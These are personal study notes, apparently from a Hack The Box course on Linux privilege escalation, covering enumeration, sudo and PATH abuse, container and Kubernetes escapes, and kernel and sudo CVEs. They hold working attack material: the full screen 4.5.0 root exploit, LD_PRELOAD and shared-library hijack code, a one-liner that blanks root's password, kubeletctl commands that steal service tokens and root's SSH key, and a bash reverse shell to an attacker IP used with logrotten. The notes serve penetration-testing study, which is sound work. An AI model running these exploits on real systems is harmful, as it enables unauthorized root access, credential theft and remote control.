**The root account on Linux systems provides full administrative level access to the operating system.**

- Fully compromising the host would allow us to capture traffic and access sensitive files
- if the Linux machine is domain joined, we can gain the NTLM hash and begin enumerating and attacking Active Directory.


# Enumeration

**Enumeration is the key to privilege escalation**

it is important to check several key details.
- OS Version
- Kernel Version
- Running Services  `ps awx | grep root`
- Installed Packages and Version 
- Logged in Users  `ps au`
- User Home Directories `ssh-key` `bashhistory` `directory with exposed creds`
- Sudo Privileges
- Configuration Files
- Readable Shadow File
- Password Hashes in /etc/passwd
- Cron Jobs
- Unmounted File Systems and Additional Drives
- SETUID and SETGID Permissions 
- Writeable Directories `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
- Writeable Files       `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`

# Environment Enumeration

such as LinPEAS and LinEnum exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. 

- `cat /etc/os-release` check the os versions and name
- `echo $PATH` `env` checking paths
- `cat /proc/version` `uname -a` checking kernal version
- `lscpu` cpu type/versions
- `cat /etc/shells` availabe shell for the loged in user

We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:

- Exec Shield
- iptables
- AppArmor
- SELinux
- Fail2ban
- Snort
- Uncomplicated Firewall (ufw)


- `lsblk` drives and share on the system
- `cat /etc/fstab` look for mounted and unmounted drives.
- `route` `netstat -rn` check the routung table
- `/etc/resolv.conf` DNS DOMAINs
- `arp -a`
- `/etc/passwd`  other users `cat /etc/passwd | cut -f1 -d:`
- `cat /etc/group` check the exexting groups  `getent group sudo`
- `ls /home` chec for the users dir and their ssh key and basj hostory.
- `df -h` mounted file system
- `cat /etc/fstab | grep -v "#" | column -t` unmounted file system
- ` find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student` all hidden files
- `find / -type d -name ".*" -ls 2>/dev/null` all hidden directories
- `ls -l /tmp /var/tmp /dev/shm` checking temp files
- `grep -r -l 'HTB{' / 2>/dev/null` check the file content


Network Interfaces `ip -a`
Hosts `cat /etc/hosts`
user last login `lastlog`
loged in with us `who` `finger`
fined history files `find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`
cron tab `ls -la /etc/cron.daily/`
proc `find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`
installed pkg `apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list`
sudo version `sudo -V`
biniries `ls -l /bin /usr/bin/ /usr/sbin/`
GTFObins `for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done`
trace systum calls `strace ping -c1 10.129.112.20`
configs files `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`
scripts files `find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"`
process runa s root ` ps aux | grep root`


# Credential Hunting
When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

    cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
    find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# SSH Keys

    ls ~/.ssh

# Environment-based Privilege Escalation
## path abuse
PATH is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary.

add the current directory to the path 

    htb_student@NIX02:~$ PATH=.:${PATH}
    htb_student@NIX02:~$ export PATH
    htb_student@NIX02:~$ echo $PATH

creating s simple script/binaries and run in the added dir

    htb_student@NIX02:~$ touch ls
    htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
    htb_student@NIX02:~$ chmod +x ls

## Wildcard Abuse

Character| 	Significance
|-|-|
*| 	An asterisk that can match any number of characters in a file name.
?| 	Matches a single character.
[ ]| 	Brackets enclose characters and can match any single one at the defined position.
~| 	A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.
-| 	A hyphen within brackets will denote a range of characters.

## Escaping Restricted Shells

A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. eg: RBASH, RKSH, RASH

### Escaping
Command injection 
    
    ls -l `pwd`

**Command Substitution -** This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). 

**Command Chaining -**  it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. 

**Environment Variables -** escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell.

**Shell Functions -**  it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.


## Sudo Rights Abuse

    sudo -l

Two best practices that should always be considered when provisioning sudo rights:

1.	Always specify the absolute path to any binaries listed in the sudoers file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the sudoers entry specifies cat instead of /bin/cat this could likely be abused).
2.	Grant sudo rights sparingly and based on the principle of least privilege. Does the user need full sudo rights? Can they still perform their job with one or two entries in the sudoers file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.


## Privileged Groups

### LXC/LXD
LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.


### Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command docker run -v /root:/mnt -it ubuntu. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.

### Disk
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

### ADM
Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.



## Capabilities

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.

    sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic

Capability| 	Description
|-|-|
cap_sys_admin| 	Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.
cap_sys_chroot| 	Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.
cap_sys_ptrace| 	Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.
cap_sys_nice| 	Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.
cap_sys_time| 	Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.
cap_sys_resource| 	Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.
cap_sys_module| 	Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.
cap_net_bind_service| 	Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.
cap_setuid| 	Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.
cap_setgid| 	Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.
cap_sys_admin| 	This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.
cap_dac_override| 	Allows bypassing of file read, write, and execute permission checks.
****

Capability Values| 	Description
|-|-|
=| 	This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.
+ep	| This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.
+ei| 	This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.
+p| 	This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.


##3 Enumerating Capabilities

    find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

##3 Exploitation

    getcap /usr/bin/vim.basic


    Keshri@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
    Keshri@htb[/htb]$ cat /etc/passwd | head -n1

## Service-based Privilege Escalation

### Vulnerable Services
TOOL NAME - screen v4.5.0

    screen -v    # check the version of the screen 

code BASH

    #!/bin/bash
    # screenroot.sh
    # setuid screen v4.5.0 local root exploit
    # abuses ld.so.preload overwriting to get root.
    # bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
    # HACK THE PLANET
    # ~ infodox (25/1/2017)
    echo "~ gnu/screenroot ~"
    echo "[+] First, we create our shell and library..."
    cat << EOF > /tmp/libhax.c
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/stat.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/tmp/rootshell", 0, 0);
        chmod("/tmp/rootshell", 04755);
        unlink("/etc/ld.so.preload");
        printf("[+] done!\n");
    }
    EOF
    gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
    rm -f /tmp/libhax.c
    cat << EOF > /tmp/rootshell.c
    #include <stdio.h>
    int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
    }
    EOF
    gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
    rm -f /tmp/rootshell.c
    echo "[+] Now we create our /etc/ld.so.preload file..."
    cd /etc
    umask 000 # because
    screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
    echo "[+] Triggering..."
    screen -ls # screen itself is setuid, so...
    /tmp/rootshell


## Cron Job Abuse
Cron jobs can also be set run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc.  When created, the cron file will be created in /var/spool/cron for the specific user that creates i Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours.

    find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null


We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.

    ./pspy64 -pf -i 1000


## Containers
Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.
## Linux Containers
Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.

## Linux Daemon
Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container.

we must be in either the lxc or lxd group. We can find this out with the following command:

    id

import and list the container 

    container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
    container-user@nix02:~$ lxc image list

set the configuration of teh container 

    container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
    container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

Start the container

    container-user@nix02:~$ lxc start privesc
    container-user@nix02:~$ lxc exec privesc /bin/bash
    root@nix02:~# ls -l /mnt/root

## Docker
Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources. One advantage is that containerization thus consumes significantly fewer resources than a traditional server or virtual machine. 

The Docker daemon
The Docker client

The Docker client acts as our interface for issuing commands and interacting with the Docker ecosystem, while the Docker daemon is responsible for executing those commands and managing containers.

**Network and Storage**
It facilitates container networking by creating virtual networks and managing network interfaces. It enables containers to communicate with each other and the outside world through network ports, IP addresses, and DNS resolution. The Docker Daemon also plays a critical role in storage management, since it handles Docker volumes, which are used to persist data beyond the lifespan of containers and manages volume creation, attachment, and clean-up, allowing containers to share or store data independently of each other.

Think of a Docker `image` as a blueprint for creating containers. It encapsulates everything needed to run an application, including the application's code, dependencies, libraries, and configurations.

A `Docker container` is an instance of a Docker image. It is a lightweight, isolated, and executable environment that runs applications. When we launch a container, it is created from a specific image, and the container inherits all the properties and configurations defined in that image.

While images are immutable and read-only, containers are mutable and can be modified during runtime

### Docker Privilege Escalation
**1. Docker Shared Directories**

When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system can be made accessible within the container. 


**2. Docker Sockets**

    htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
    htb-student@container:/tmp$ chmod +x docker
    htb-student@container:/tmp$ ls -l
    /tmp/docker -H unix:///app/docker.sock ps
    htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
    htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
    /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

**3. Docker Group**

    docker image ls  #to see whic image have exist

**4. Docker Socket**

    docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

## Kubernetes
One of the key features of Kubernetes is its adaptability and compatibility with various environments. This platform offers an extensive range of features that enable developers and system administrators to easily configure, automate, and scale their deployments and applications. Kubernetes is a container orchestration system, which functions by running all applications in containers isolated from the host system through multiple layers of protection. The K8s architecture comprises a master node and worker nodes, each with specific roles.

**K8s Concept**

Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers. Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details. Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more. Despite challenges in security and management, K8s continues to grow and improve with features like Role-Based Access Control (RBAC), Network Policies, and Security Contexts, providing a safer environment for applications.


Kubernetes architecture is primarily divided into two types of components:

- The Control Plane (master node), which is responsible for controlling the Kubernetes cluster

- The Worker Nodes (minions), where the containerized applications are run

master node hosts the Kubernetes Control Plane, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained. On the other hand, the Minions execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.


K8's Security Measures
Kubernetes security can be divided into several domains:

- Cluster infrastructure security
- Cluster configuration security
- Application security
- Data security

### Kubernetes API
- The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions.
-  The kube-apiserver is responsible for hosting the API, which handles and verifies RESTful requests for modifying the system's state.
- API objects pertain to a particular category and include essential elements such as Pods, Services, and Deployments, among others

### Authentication
- Kubernetes supports various methods such as client certificates, bearer tokens, an authenticating proxy, or HTTP basic auth, which serve to verify the user's identity
- the Kubelet can be configured to permit anonymous access. By default, the Kubelet allows anonymous access.

**K8's API Server Interaction**

    curl https://10.129.10.11:6443 -k

**Kubelet API - Extracting Pods**

    curl https://10.129.10.11:10250/pods -k | jq .

The information displayed in the output includes the names, namespaces, creation timestamps, and container images of the pods. It also shows the last applied configuration for each pod. Disclosing the last applied configuration can potentially expose sensitive information, such as passwords, secrets, or API tokens, used during the deployment of the pods.

**Kubeletctl - Extracting Pods**

    kubeletctl -i --server 10.129.10.11 pods

**Kubelet API - Available Commands**

    kubeletctl -i --server 10.129.10.11 scan rce

**Kubelet API - Executing Commands**

    kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

## Privilege Escalation
To gain higher privileges and access the host system, we can utilize a tool called kubeletctl to obtain the Kubernetes service account's token and certificate (ca.crt) from the server.

**Kubelet API - Extracting Tokens**

    kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

**Kubelet API - Extracting Certificates**

    kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

Now that we have both the token and certificate, we can check the access rights in the Kubernetes cluster.

**List Privileges**

    export token=`cat k8.token`
    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Here we can see a few very important information. Besides the selfsubject-resources we can get, create, and list pods which are the resources representing the running container in the cluster

yml

    apiVersion: v1
    kind: Pod
    metadata:
    name: privesc
    namespace: default
    spec:
    containers:
    - name: privesc
        image: nginx:1.14.2
        volumeMounts:
        - mountPath: /root
        name: mount-root-into-mnt
    volumes:
    - name: mount-root-into-mnt
        hostPath:
        path: /
    automountServiceAccountToken: true
    hostNetwork: true

**Creating a new Pod**

    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
    kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

**Extracting Root's SSH Key**

    kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

    
## Logrotate

Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called logrotate takes care of archiving or disposing of old logs. If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. 

**features**
- the size of the log file,
- its age,
- and the action to be taken when one of these factors is reached.

This tool is usually started periodically via cron and controlled via the configuration file /etc/logrotate.conf. To force a new rotation on the same day, we can set the date after the individual log files in the status file /var/lib/logrotate.status or use the -f/--force option. We can find the corresponding configuration files in /etc/logrotate.d/ directory.              

To exploit logrotate, we need some requirements that we have to fulfill.

- we need write permissions on the log files
- logrotate must run as a privileged user or root
- vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0


    git clone https://github.com/whotwagner/logrotten.git
    cd logrotten
    gcc logrotten.c -o logrotten

    #payload
    echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

before running the exploit, we need to determine which option logrotate uses in logrotate.conf.

    grep "create\|compress" /etc/logrotate.conf | grep -v "#"

**Start listiler in the attack host and run the logrotate**

    ./logrotten -p ./payload /tmp/tmp.log

## Passive Traffic Capture

If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as net-creds and PCredz that can be used to examine data being passed on the wire. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

## Weak NFS Privileges

    showmount -e 10.129.2.12

Option	Description
root_squash	If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set.
no_root_squash	Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.

    cat /etc/exports


## Hijacking Tmux Sessions

create and give set the gorup

    htb@NIX02:~$ tmux -S /shareds new -s debugsess
    htb@NIX02:~$ chown root:devs /shareds

check the running tmux session

    ps aux | grep tmux

chect the group have access on this session
    
    ls -la /shareds 

attached the session

    tmux -S /shareds


## Kernel Exploits
Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is Dirty COW (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges. 

checking kernel version

    uname -a
    cat /etc/lsb-release 

We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for linux 4.4.0-116-generic exploit
Download the exploit transfer to the target system.

    gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
    ./kernel_exploit 


## Shared Libraries

t is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: static libraries (denoted by the .a file extension) and dynamically linked shared object libraries (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

This includes the -rpath or -rpath-link flags when compiling a program, using the environmental variables LD_RUN_PATH or LD_LIBRARY_PATH, placing libraries in the /lib or /usr/lib default directories, or specifying another directory containing the libraries within the /etc/ld.so.conf configuration file.


see the LD_preloaded lib

    ldd /bin/ls

**LD_PRELOAD Privilege Escalation**

    sudo -l


compile it and run it 

    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
    }

    gcc -fPIC -shared -o root.so root.c -nostartfiles

    # run the binary
    sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

## Shared Object Hijacking

Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary.

  Shared Object Hijacking
htb_student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
We can use ldd to print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.

  Shared Object Hijacking
htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
We see a non-standard library named libshared.so listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.

  Shared Object Hijacking
htb_student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
The configuration allows the loading of libraries from the /development folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in /development, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).

  Shared Object Hijacking
htb_student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
Before compiling a library, we need to find the function name called by the binary.

  Shared Object Hijacking
htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
  Shared Object Hijacking
htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
  Shared Object Hijacking
htb_student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
We can copy an existing library to the development folder. Running ldd against the binary lists the library's path as /development/libshared.so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named dbquery. We can compile a shared object which includes this function.

Code: c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

The dbquery function sets our user id to 0 (root) and executing /bin/sh when called. Compile it using GCC.

  Shared Object Hijacking
htb_student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
Executing the binary again should display the banner and pops a root shell.

  Shared Object Hijacking
htb_student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded

    id
    uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)

## Python Library Hijacking
Many libraries are used in Python and are used in many different fields. One of them is NumPy. NumPy is an open-source extension for Python. The module provides precompiled functions for numerical analysis. such as functions of random number generation, Fourier transform, linear algebra, and many others. 

Another library is Pandas. Pandas is a library for data processing and data analysis with Python. It extends Python with data structures and functions for processing data tables. A particular strength of Pandas is time series analysis. 

there are three basic vulnerabilities where hijacking can be used:

- Wrong write permissions
- Library Path
- PYTHONPATH environment variable

### Wrong Write Permissions
This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.
This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If SUID/SGID permissions have been assigned to the Python script that imports this module, our code will automatically be included.

permission on python code

    ls -l mem_status.py

So we can execute this script with the privileges of another user, in our case, as root. We also have permission to view the script and read its contents.

**Python Script - Contents**

    #!/usr/bin/env python3
    import psutil

    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

    print(f"Available memory: {round(available_memory, 2)}%")

**module permission**

    htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

    /usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
    /usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
    /usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
    /usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
    /usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
    /usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
    /usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


    htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

    -rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

**Module Content**

    ...SNIP...

    def virtual_memory():

        ...SNIP...
        
        global _TOTAL_PHYMEM
        ret = _psplatform.virtual_memory()
        # cached for later use in Process.memory_percent()
        _TOTAL_PHYMEM = ret.total
        return ret

    ...SNIP...

**Module Contents - Hijacking**

    ...SNIP...

    def virtual_memory():

        ...SNIP...
        #### Hijacking
        import os
        os.system('id')
        

        global _TOTAL_PHYMEM
        ret = _psplatform.virtual_memory()
        # cached for later use in Process.memory_percent()
        _TOTAL_PHYMEM = ret.total
        return ret

    ...SNIP...

Run 

    sudo /usr/bin/python3 ./mem_status.py

### Library Path

PYTHONPATH Listing

    python3 -c 'import sys; print("\n".join(sys.path))'

To be able to use this variant, two prerequisites are necessary.

- The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable.
- We must have write permissions to one of the paths having a higher priority on the list.

**Default Installation Location**

    pip show <module naem>

we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us write access to any of them. Let us check.

Misconfiguration dir Permission

    ls -la /usr/lib/python3.8

After checking all of the directories listed, it appears that /usr/lib/python3.8 path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the PYTHONPATH variable, we can see that this path is higher on the list than the path in which psutil is installed in. Let us try abusing this misconfiguration to create our own psutil module containing our own malicious virtual_memory() function within the /usr/lib/python3.8 directory.

Hijacked Module Contents - psutil.py
Code: python

    #!/usr/bin/env python3

    import os

    def virtual_memory():
        os.system('id')

    sudo /usr/bin/python3 mem_status.py


### PYTHONPATH Environment Variable

    sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py


## recent 0-day vuln 
##SUDO
The /etc/sudoers file specifies which users or groups are allowed to run specific programs and with what privileges.

    sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
    sudo -V | head -n1                                                  #find the version of sudo

    cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
    cry0l1t3@nix02:~$ cd CVE-2021-3156
    cry0l1t3@nix02:~$ make

    cat /etc/lsb-release                                               #kernal and os version

    ./sudo-hax-me-a-sandwich 1                  #respective ID for the version operating system and run the exploit with our payload.


## Sudo Policy Bypass
Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the /etc/sudoers file to execute a specific command.

    sudo -u#-1 id

## Polkit
PolicyKit (polkit) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, polkit is asked. It is possible to set how permissions are granted by default for each user and application.

Polkit works with two groups of files.

- actions/policies (/usr/share/polkit-1/actions)
- rules (/usr/share/polkit-1/rules.d)

Polkit also has local authority rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory /etc/polkit-1/localauthority/50-local.d with the file extension .pkla.

PolKit also comes with three additional programs:

- pkexec - runs a program with the rights of another user or with root rights
- pkaction - can be used to display actions
- pkcheck - this can be used to check if a process is authorized for a specific action

    cry0l1t3@nix02:~$ # pkexec -u <user> <command>
    cry0l1t3@nix02:~$ pkexec -u root id

    uid=0(root) gid=0(root) groups=0(root)


    cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
    cry0l1t3@nix02:~$ cd CVE-2021-4034
    cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc

## Dirty Pipe

A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the Dirty Cow vulnerability discovered in 2016. All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability.This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. 

